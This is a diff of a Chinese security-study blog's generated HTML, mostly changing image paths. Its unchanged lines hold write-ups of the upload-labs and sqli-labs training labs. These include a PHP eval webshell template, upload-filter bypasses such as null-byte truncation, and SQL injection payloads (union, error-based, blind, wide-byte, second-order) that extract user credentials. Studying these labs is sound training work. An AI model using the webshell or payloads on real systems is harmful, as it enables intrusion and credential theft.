@@ -93,9 +93,9 @@
 <ul>
 <li><strong>上传漏洞类型大体可分为以下几类：</strong></li>
 </ul>
-<p><img src="/2021/02/09/upload-labs-pass1-13/1.png" alt="1"></p>
+<p><img src="/upload-labs-pass1/1.png" alt="1"></p>
 <ul>
-<li><p>判断上传漏洞类型的思路：<img src="/2021/02/09/upload-labs-pass1-13/2.png" alt="2" style="zoom: 200%;"></p>
+<li><p>判断上传漏洞类型的思路：<img src="/upload-labs-pass1/2.png" alt="2" style="zoom: 200%;"></p>
 </li>
 <li><p><strong>webshell（一句话木马）的制备</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板： <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;password&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -115,8 +115,8 @@
 </li>
 </ul>
 <h1 id="pass-01：js检查"><a href="#pass-01：js检查" class="headerlink" title="pass-01：js检查"></a>pass-01：js检查</h1><p>打开pass-01的index.php查看源码，我们看到网页对上传的图片做了js检查，</p>
-<p><img src="/2021/02/09/upload-labs-pass1-13/3.png" alt="3"></p>
-<p>而且设置了上传白名单，<img src="/2021/02/09/upload-labs-pass1-13/4.png" alt="4"></p>
+<p><img src="/upload-labs-pass1/3.png" alt="3"></p>
+<p>而且设置了上传白名单，<img src="/upload-labs-pass1/4.png" alt="4"></p>
 <p>因此题目要求我们上传一个webshell到服务器上，我们可以有以下三种思路：</p>
 <ol>
 <li>删除那段有关js检查的代码</li>
@@ -130,7 +130,7 @@
 <p><strong>常见的MIME类型：</strong></p>
 <p>udio/mpeg -&gt; .mp3<br>application/msword -&gt; .doc<br>application/octet-stream -&gt; .exe<br>application/pdf -&gt; .pdf<br>application/x-javascript -&gt; .js<br>application/x-rar -&gt; .rar<br>application/zip -&gt; .zip<br>image/gif -&gt; .gif<br>image/jpeg -&gt; .jpg / .jpeg<br>image/png -&gt; .png<br>text/plain -&gt; .txt<br>text/html -&gt; .html<br>video/mp4 -&gt; .mp4</p>
 <ul>
-<li><strong>查看源码：</strong><img src="/2021/02/09/upload-labs-pass1-13/5.png" alt="5"></li>
+<li><strong>查看源码：</strong><img src="/upload-labs-pass1/5.png" alt="5"></li>
 </ul>
 <p>也就是说服务器还是规定了白名单，那么我们可以有以下两种思路：</p>
 <p>1.先将webshell后缀类型改为允许上传的文件后缀类型（使其绕过MIME检查），然后burp抓包，将webshell后缀改回.php。</p>
@@ -149,7 +149,7 @@
 </ul>
 <p>​      我们看到黑名单中没有禁用这些可解析后缀，因此我们可以利用这一点，上传可解析后缀。</p>
 <ul>
-<li><p>sp：常用可解析后缀<img src="/2021/02/09/upload-labs-pass1-13/6.png" alt="6"></p>
+<li><p>sp：常用可解析后缀<img src="/upload-labs-pass1/6.png" alt="6"></p>
 </li>
 <li><p>陌生函数：</p>
 </li>
@@ -324,7 +324,7 @@
 <p>先补充知识：</p>
 <p>1.php语法中，当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生。</p>
 <p>2.%00是对ascii码中的0对应的字符编码后的结果，0x00则是%00解码成的16进制。当url中的参数是通过GET方式获取时，%00会被自动解码。当通过POST方式获取时，不会自动解码，%00只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它改写为十六进制0x00。</p>
-<p><img src="/2021/02/09/upload-labs-pass1-13/7.png" alt="7"></p>
+<p><img src="/upload-labs-pass1/7.png" alt="7"></p>
 <p>那么这关我们的思路就是：上传webshell.png，抓包，令save_pasth=../upload/webshell.php%00</p>
 <p>sp：strrpos()函数</p>
 <p>功能：strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。返回字符（字符串）在目标字符串中最后一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。</p>
@@ -351,13 +351,13 @@
 </tbody></table>
 <h1 id="pass-13：0x00截断（post型）"><a href="#pass-13：0x00截断（post型）" class="headerlink" title="pass-13：0x00截断（post型）"></a>pass-13：0x00截断（post型）</h1><p>法一：同pass-12</p>
 <p>法二：上传webshell.png，抓包</p>
-<p><img src="/2021/02/09/upload-labs-pass1-13/8.png" alt="8"></p>
-<p>加上webshell.php，然后点开Hex，将webshell.php后面的20改为00，如果找不到20，那么就在raw的webshell.php后面加个空格<img src="/2021/02/09/upload-labs-pass1-13/9.png" alt="9"></p>
+<p><img src="/upload-labs-pass1/8.png" alt="8"></p>
+<p>加上webshell.php，然后点开Hex，将webshell.php后面的20改为00，如果找不到20，那么就在raw的webshell.php后面加个空格<img src="/upload-labs-pass1/9.png" alt="9"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/09/upload-labs-pass1-13/" data-id="ckozphtuw003ezsvu23gt5yxy" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/09/upload-labs-pass1-13/" data-id="ckr0oba3f0032i8vuaxr0apnk" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li></ul>
@@ -414,7 +414,7 @@
 <h1 id="lesson56："><a href="#lesson56：" class="headerlink" title="lesson56："></a>lesson56：</h1><p>同lesson54，不过注入类型改为了<code>&#39;)</code>。</p>
 <h1 id="lesson57"><a href="#lesson57" class="headerlink" title="lesson57:"></a>lesson57:</h1><p>同lesson54，不过注入类型改为了<code>&quot;</code>。</p>
 <h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58:"></a>lesson58:</h1><p>执行 sql 语句后，并没有返回数据库当中的数据，所以我们这里不能使用 union 联合注入， 这里使用报错注入或者延时注入。</p>
-<p><img src="/2021/02/08/lesson54-65/1.png" alt="1"></p>
+<p><img src="/blog54-65/1.png" alt="1"></p>
 <h1 id="lesson59："><a href="#lesson59：" class="headerlink" title="lesson59："></a>lesson59：</h1><p>同lesson58，注入类型变为数字型。</p>
 <h1 id="lesson60："><a href="#lesson60：" class="headerlink" title="lesson60："></a>lesson60：</h1><p>同lesson58，注入类型变为<code>&quot;)</code>。</p>
 <h1 id="lesson61："><a href="#lesson61：" class="headerlink" title="lesson61："></a>lesson61：</h1><p>同lesson58，注入类型变为<code>&#39;))</code></p>
@@ -424,7 +424,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/08/lesson54-65/" data-id="ckozphtuv003czsvu0r1558go" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/08/lesson54-65/" data-id="ckr0oba3d002vi8vudfk3b9ce" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -459,7 +459,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="background——Order-by后的注入："><a href="#background——Order-by后的注入：" class="headerlink" title="background——Order by后的注入："></a>background——Order by后的注入：</h1><p> 查看mysql官方select的文档：</p>
-<p><img src="/2021/02/07/lesson46-53/1.jpg" alt="1"></p>
+<p><img src="/lesson46/1.jpg" alt="1"></p>
 <p>由于order by 后面只能接(字段名，表达式，位置)等信息，我们并不能向原来一样使用联合查询。</p>
 <p>查看lesson46的源码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;sort&#x27;];	</span><br><span class="line">if(isset($id))</span><br><span class="line">	&#123;</span><br><span class="line">	//logging the connection parameters to a file for analysis.</span><br><span class="line">	$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">	fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">	fclose($fp);</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">id</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
@@ -479,17 +479,17 @@
 <h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select * from (select concat_ws(‘ ‘,id,username,password) from users limit 0,1) x)),1)</p>
 <p>注：这边不知道为什么<code>&#39;#&#39;</code>不能用了，找了半天原因。</p>
 <h2 id="解法二-布尔盲注："><a href="#解法二-布尔盲注：" class="headerlink" title="解法二.布尔盲注："></a>解法二.布尔盲注：</h2><p>SQL 像 PHP，也是一种弱类型，它会认为<code>true=1</code>，<code>false=0</code>。用在<code>order by</code>后会直接导致显示不同：</p>
-<p>A:<img src="/2021/02/07/lesson46-53/image-20210209171458273.png" alt="image-20210209171458273"></p>
-<p>B:<img src="/2021/02/07/lesson46-53/2.png" alt="2"></p>
-<p>C:<img src="/2021/02/07/lesson46-53/3.png" alt="3"></p>
+<p>A:<img src="/lesson46/image-20210209171458273.png" alt="image-20210209171458273"></p>
+<p>B:<img src="/lesson46/2.png" alt="2"></p>
+<p>C:<img src="/lesson46/3.png" alt="3"></p>
 <p>通过对比A,C我们可以发现，<code>order by</code>后接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是<strong>没有作用</strong>的！也就是说我们无法使用句式一、二进行布尔盲注，那么我们能不能使用句式三进行布尔盲注呢？</p>
-<p>我们先输入：?sort=rand(true)<img src="/2021/02/07/lesson46-53/4.png" alt="4"></p>
-<p>再输入：?sort=rand(false)<img src="/2021/02/07/lesson46-53/5.png" alt="5"></p>
+<p>我们先输入：?sort=rand(true)<img src="/lesson46/4.png" alt="4"></p>
+<p>再输入：?sort=rand(false)<img src="/lesson46/5.png" alt="5"></p>
 <p>我们可以看到两种得到的返回不同，那么就说明我们可以利用句式三来进行布尔盲注。</p>
 <p><strong>Q:其实这边有一个疑问，不是说order by后接的数字不起作用吗，为什么rand函数的返回值也是数字，但是却可以起作用呢？我突然有个猜想——order by后接字符、字符串或布尔值是不起作用的，也就是说数据库返回值不会根据字符串的不同而不同，如果是这样就可以理解为什么了,可是在我用时间盲注解这关的时候if函数返回值是1但是页面返回却和?sort=1的不同。我蒙了，算了，挖个坑吧！！！！！！！！！！！！！！！！！</strong></p>
 <p>我们的布尔盲注思路是这样的：?sort=rand（sql语句），如果sql语句正确，那么页面的返回会和?sort=rand(true)一样（利用了rand函数的伪随机性），反之和?sort=rand(false)一样。</p>
 <p><strong>sp：rand()函数是个随机函数，返回0~1间的小数。使用时也可以给定参数值（随机种子），相同的参数生成的结果也相同（伪随机性）。</strong></p>
-<h3 id="爆库：-1"><a href="#爆库：-1" class="headerlink" title="爆库："></a>爆库：</h3><p>?sort=rand(left(database(),8)=’security’)<img src="/2021/02/07/lesson46-53/6.png" alt="6"></p>
+<h3 id="爆库：-1"><a href="#爆库：-1" class="headerlink" title="爆库："></a>爆库：</h3><p>?sort=rand(left(database(),8)=’security’)<img src="/lesson46/6.png" alt="6"></p>
 <p>我们看到页面返回与?sort=rand(true)的一样，说明数据库名就是security。</p>
 <p>后续的爆表，爆列等也是这样，构造payload然后比对页面返回得结果。不多赘述。</p>
 <h2 id="解法三-时间盲注："><a href="#解法三-时间盲注：" class="headerlink" title="解法三.时间盲注："></a>解法三.时间盲注：</h2><p>时间注入可以利用句式一或者句式二。在这里我们就简单的拿爆库举个例子，剩下的参考时间盲注那一关的笔记。</p>
@@ -502,7 +502,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/07/lesson46-53/" data-id="ckozphtuv003azsvu42999wvk" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/07/lesson46-53/" data-id="ckr0oba3e0030i8vudvr3a6j0" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -543,12 +543,12 @@
 <p><strong>sp：关于数据库的一些增删改查在另一篇博客已经专门介绍了，这里不多赘述。</strong></p>
 <h2 id="lesson38："><a href="#lesson38：" class="headerlink" title="lesson38："></a>lesson38：</h2><p>认识一下新函数：</p>
 <ul>
-<li><p>mysqli_connect()函数：<br>功能：打开一个到 MySQL 服务器的新的连接。<br>语法：mysqli_connect(host,username,password,dbname,port,socket)；<img src="/2021/02/06/lesson38-45/1.png" alt="1"></p>
+<li><p>mysqli_connect()函数：<br>功能：打开一个到 MySQL 服务器的新的连接。<br>语法：mysqli_connect(host,username,password,dbname,port,socket)；<img src="/lesson38/1.png" alt="1"></p>
 </li>
-<li><p>mysqli_select_db()函数：<br>作用：用于更改连接的默认数据库。<br>语法：mysqli_select_db(connection,dbname)<img src="/2021/02/06/lesson38-45/2.png" alt="2"></p>
+<li><p>mysqli_select_db()函数：<br>作用：用于更改连接的默认数据库。<br>语法：mysqli_select_db(connection,dbname)<img src="/lesson38/2.png" alt="2"></p>
 </li>
 <li><p>mysqli_multi_query()函数：<br>语法：mysqli_multi_query(connection,query)；</p>
-<p>功能：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。<img src="/2021/02/06/lesson38-45/3.jpg" alt="3"></p>
+<p>功能：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。<img src="/lesson38/3.jpg" alt="3"></p>
 <p><strong>注：这个函数是可实现堆叠注入的重要因素！</strong></p>
 </li>
 <li><p>mysql_store_result()函数：<br>功能：用于将mysqli_query()查询的结果集存储到变量中</p>
@@ -569,7 +569,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/06/lesson38-45/" data-id="ckozphtuu0038zsvu3ahueg1s" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/06/lesson38-45/" data-id="ckr0oba3e002xi8vue70y2vrg" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -628,7 +628,7 @@
 <h2 id="lesson33："><a href="#lesson33：" class="headerlink" title="lesson33："></a>lesson33：</h2><p>和lesson32一模一样。</p>
 <h2 id="lesson34："><a href="#lesson34：" class="headerlink" title="lesson34："></a>lesson34：</h2><p>这关我还以为会和之前两关一样，只不过改为post类型，结果发现了一些不同。</p>
 <p>当我在username输入admin%aa’ union select 1,database()#，登入失败，按理来说不应该呀。于是我用burpsuite抓包：</p>
-<p><img src="/2021/02/06/lesson32-37/1.png" alt="1"></p>
+<p><img src="/lesson32/1.png" alt="1"></p>
 <p>我们明明输入的uname=admin%aa’ union select 1,database()#，可是我们看到多了一个<code>25</code>在%aa中间，这是什么情况呢？<strong>原来，get与post提交数据类型不同，get型如果输入符合url的格式那么就直接以url形式提交，也就是说遇到%aa这种直接当做url编码处理，而post型却不是这样，他会把你提交的%aa当做正常数据，然后进行url编码，于是就变成了%25aa。</strong></p>
 <ul>
 <li><p>那么我们要怎么避免这个问题呢?</p>
@@ -639,7 +639,7 @@
 <p><strong>补充：不同类型编码</strong></p>
 <p>UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。<br>UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节<br>Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。</p>
 <p>—）我们还可以用另外一种方式：?id=牛’ or 1=1#    </p>
-<p><img src="/2021/02/06/lesson32-37/2.png" alt="2"></p>
+<p><img src="/lesson32/2.png" alt="2"></p>
 <p>在经过url编码后，<code>牛</code>被编码成三个字节加上单引号一个字节，再加上单引号被转义后反斜杠一个字节，总共五个字节，我们已经知道gbk编码时两个字节为一汉字，那么这样转义单引号用的反斜杠被合并，单引号“逃逸”成功。</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/Unicode-UTF.php%E5%9C%A8%E7%BA%BFUnicode%E5%92%8CUTF%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BD%91%E5%9D%80">https://www.qqxiuzi.cn/bianma/Unicode-UTF.php在线Unicode和UTF编码转换网址</a></li>
@@ -651,7 +651,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/06/lesson32-37/" data-id="ckozphtut0034zsvu9dl66937" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/06/lesson32-37/" data-id="ckr0oba3c002qi8vu0g310trp" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -686,16 +686,16 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="background："><a href="#background：" class="headerlink" title="background："></a>background：</h1><p>首先，我们先来了解一下什么是web应用的基本架构：</p>
-<p><img src="/2021/02/05/lesson29-31/2.png" alt="2"></p>
+<p><img src="/lesson29/2.png" alt="2"></p>
 <p>lesson29这关中，服务端web应用有两个，一个是以tomcat为引擎的jsp型服务器，一个是以apache为引擎的php型服务器：</p>
-<p><img src="/2021/02/05/lesson29-31/1675852-20190529114341522-1690756767.png" alt="img"></p>
+<p><img src="/lesson29/1675852-20190529114341522-1690756767.png" alt="img"></p>
 <p><strong>打开indexjsp查看源码：</strong></p>
-<p><img src="/2021/02/05/lesson29-31/5.png" alt="5"></p>
+<p><img src="/lesson29/5.png" alt="5"></p>
 <p>方框内执行的是判断tomcat获取的id是否为纯数字。</p>
 <p>接着，如果id是纯数字，它“确认安全”，就会把输入传递给apache服务器。</p>
 <p>这过程中tomcat的作用就相当于一道waf（防火墙）。那么我们怎么绕过这个防火墙呢？</p>
 <p>悉知，大多数服务器对参数的解析：</p>
-<p><img src="/2021/02/05/lesson29-31/3.png" alt="3"></p>
+<p><img src="/lesson29/3.png" alt="3"></p>
 <p>也就是说，当遇到多个参数时，tomcat只会获取第一个参数，对其进行上述处理，只要第一个参数复合它的要求，tomcat就会把我们的输入传递到下一级。因此我们可以利用这一特点，构造多个参数来达到目的。</p>
 <h1 id="lesson29："><a href="#lesson29：" class="headerlink" title="lesson29："></a>lesson29：</h1><h2 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h2><p>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
@@ -715,7 +715,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/05/lesson29-31/" data-id="ckozphtut0036zsvud1359ny5" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/05/lesson29-31/" data-id="ckr0oba3b002ni8vu17e861sc" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -757,7 +757,7 @@
 <p>（4）利用符号 and=&amp;&amp;，or=||</p>
 <p>（5）构造字符串——oorr，anandd</p>
 <p>我们查看源码：</p>
-<p><img src="/2021/02/04/lesson25-28a/1.png" alt="1"></p>
+<p><img src="/lesson25/1.png" alt="1"></p>
 <p>这里的or和and采用了i正则匹配，大小写都无法绕过。</p>
 <p>{               <strong>拓展一下PHP正则表达式的模式修饰符</strong></p>
 <ul>
@@ -780,35 +780,35 @@
 <p>从中得知这关为单引号类型注入。</p>
 <p>当输入?id=1时，页面有回显。那么我们可以采用union联合注入。</p>
 <h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库:"></a>爆库:</h3><p>输入：?id=0’  union select 1,2,database()–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/2.png" alt="2"></p>
+<p>得，<img src="/lesson25/2.png" alt="2"></p>
 <h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=0’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where </p>
 <p>table_schema=’security’–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/3.png" alt="3"></p>
+<p>得，<img src="/lesson25/3.png" alt="3"></p>
 <p>注：information中也含有or，因此也需要做绕过处理。</p>
 <h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=0’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where </p>
 <p>table_schema=’security’–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/4.png" alt="4"></p>
+<p>得，<img src="/lesson25/4.png" alt="4"></p>
 <h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=0’ union select 1,2,group_concat(username,0x3a,passwoorrd) from users–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/5.png" alt="5"></p>
+<p>得，<img src="/lesson25/5.png" alt="5"></p>
 <p>注：password中也含有or，因此也需要做绕过处理。</p>
 <h2 id="lesson25a"><a href="#lesson25a" class="headerlink" title="lesson25a:"></a>lesson25a:</h2><p>和lesson25没什么区别，注意注入类型就好了。</p>
-<h2 id="lesson26："><a href="#lesson26：" class="headerlink" title="lesson26："></a>lesson26：</h2><p>查看源码：<img src="/2021/02/04/lesson25-28a/6.png" alt="6"></p>
+<h2 id="lesson26："><a href="#lesson26：" class="headerlink" title="lesson26："></a>lesson26：</h2><p>查看源码：<img src="/lesson25/6.png" alt="6"></p>
 <p>我们可以看到它就过滤了一堆字符。此时，我们可以采用<strong>URL编码</strong>绕过这些过滤：</p>
 <p>+       URL 中+号表示空格                 %2B<br>空格  URL中的空格可以用+号或者编码      %20<br>/        分隔目录和子目录                   %2F<br>?        分隔实际的URL和参数               %3F<br>%       指定特殊字符                     %25<br>#       表示书签                         %23<br>&amp;       URL 中指定的参数间的分隔符         %26<br>=        URL 中指定参数的值                %3D</p>
 <p>我不知道为什么空格我一直找不到绕开的方法，上面的几种都不行，好像是apache的问题，要我们用linux系统才能绕过。既然这样我们只能避免输入空格了，使用报错注入——</p>
 <h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,database()),1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/7.png" alt="7"></p>
+<p>得，<img src="/lesson25/7.png" alt="7"></p>
 <h3 id="爆表：-1"><a href="#爆表：-1" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/8.png" alt="8"></p>
+<p>得，<img src="/lesson25/8.png" alt="8"></p>
 <h3 id="爆列：-1"><a href="#爆列：-1" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’anandd(table_schema=’security’)))),1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/9.png" alt="9"></p>
+<p>得，<img src="/lesson25/9.png" alt="9"></p>
 <h3 id="爆值：-1"><a href="#爆值：-1" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=1’||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/10.png" alt="10"></p>
+<p>得，<img src="/lesson25/10.png" alt="10"></p>
 <p>这里有一个问题，limit因为过滤因素用不了，很难受，而且报错长度又有限，那么这时我们可以通过控制id的值来一个个查询，例如输入：?id=1’ || updatexml(1, concat(0x7e, (select (group_concat(  concat_ws(0x7e,username,passwoorrd)  )) from (security.users)  where(id=5))) ,1)  || ‘1’=’1</p>
 <h2 id="lesson26a："><a href="#lesson26a：" class="headerlink" title="lesson26a："></a>lesson26a：</h2><p>当我们输入导致sql语法错误的时候，不会回显，那么我们就无法使用报错注入了。</p>
 <h2 id="lesson27："><a href="#lesson27：" class="headerlink" title="lesson27："></a>lesson27：</h2><p>同lesson26，报错注入。</p>
 <p>源码：</p>
-<p><img src="/2021/02/04/lesson25-28a/11.png" alt="11"></p>
+<p><img src="/lesson25/11.png" alt="11"></p>
 <ul>
 <li><p>若想使用union联合注入，只需要将 union 和 select 改为大小写混合就可以了。</p>
 </li>
@@ -820,7 +820,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/04/lesson25-28a/" data-id="ckozphtur0030zsvuhn6k8m6u" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/04/lesson25-28a/" data-id="ckr0oba3c002si8vu5ijj996e" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -861,22 +861,22 @@
 <ul>
 <li>点击：Forgot your password？</li>
 </ul>
-<p>页面跳转：<img src="/2021/02/03/lesson24/1.png" alt="1"></p>
+<p>页面跳转：<img src="/lesson24/1.png" alt="1"></p>
 <p>大意是如果你忘了你的密码，就自己黑了他。那么我们肯定不能在这里下手了。</p>
 <ul>
 <li>点击：New User click here?</li>
-<li>页面跳转：<img src="/2021/02/03/lesson24/3.png" alt="3"></li>
+<li>页面跳转：<img src="/lesson24/3.png" alt="3"></li>
 </ul>
 <p>我们看到这就是一个普通的注册界面，有什么用呢，我们先暂不言表。</p>
 <p>我们接着试探，输入正确账号密码，进入到一个修改密码的网页：</p>
-<p><img src="/2021/02/03/lesson24/4.png" alt="4"></p>
+<p><img src="/lesson24/4.png" alt="4"></p>
 <p>不知道哪个地方可以注入，我们先<strong>打开login的源码：</strong></p>
-<p><img src="/2021/02/03/lesson24/6.png" alt="6"></p>
+<p><img src="/lesson24/6.png" alt="6"></p>
 <p>发现登入页面输入的账号密码都被转义了，那么肯定不能直接注入，接着看代码：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;username&quot;] = $login;</span><br></pre></td></tr></table></figure>
 
 <p>发现它设了一个新变量储存从数据库中选择出来的username的值。</p>
-<p><strong>打开pass_change的源码：</strong><img src="/2021/02/03/lesson24/5.png" alt="5"></p>
+<p><strong>打开pass_change的源码：</strong><img src="/lesson24/5.png" alt="5"></p>
 <p>我们可以看出从改密码的页面注入是不可行的了，但是我们发现从数据库中选择出来的username没有被复查，直接构造成sql语句，带入到数据库中。于是我们就可以有这样一种思路，我们先注册一个账号，例如：账户：admin’#（admin为目标用户名），密码：123。</p>
 <p>然后我们输入我们注册的这个账号密码登入，进入修改密码页面，</p>
 <p>pass_change的源码中sql语句是：</p>
@@ -893,7 +893,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/03/lesson24/" data-id="ckozphtus0032zsvu8q63gekw" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/03/lesson24/" data-id="ckr0oba3a002ii8vu24y43ek9" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -937,7 +937,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = &quot;/<span class="comment">#/&quot;;</span></span><br><span class="line">$reg1 = &quot;/<span class="comment">--/&quot;;</span></span><br><span class="line">$<span class="keyword">replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$id = preg_replace($reg, $<span class="keyword">replace</span>, $<span class="keyword">id</span>);</span><br><span class="line">$id = preg_replace($reg1, $<span class="keyword">replace</span>, $<span class="keyword">id</span>);</span><br></pre></td></tr></table></figure>
 
 <p><strong>介绍一下preg_replace()函数：</strong></p>
-<p><img src="/2021/02/03/lesson23/1.png" alt="1"></p>
+<p><img src="/lesson23/1.png" alt="1"></p>
 <p>因此我们得知  <code>&#39;--+&#39;</code>   和 <code>#</code>  都被屏蔽掉了，那么我们要怎么闭合sql语句呢？</p>
 <h5 id="1-union注入时"><a href="#1-union注入时" class="headerlink" title="1.union注入时"></a>1.union注入时</h5><p>以爆库为例：?id=-1’  union select 1,database(),’3   </p>
 <p>​               或：?id=-1’  union select 1,database(),3 or ‘1’=’ </p>
@@ -947,7 +947,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/03/lesson23/" data-id="ckozphtur002yzsvuckvg4kd5" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/03/lesson23/" data-id="ckr0oba37002bi8vuhv5g3lo6" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
@@ -983,7 +983,7 @@
       
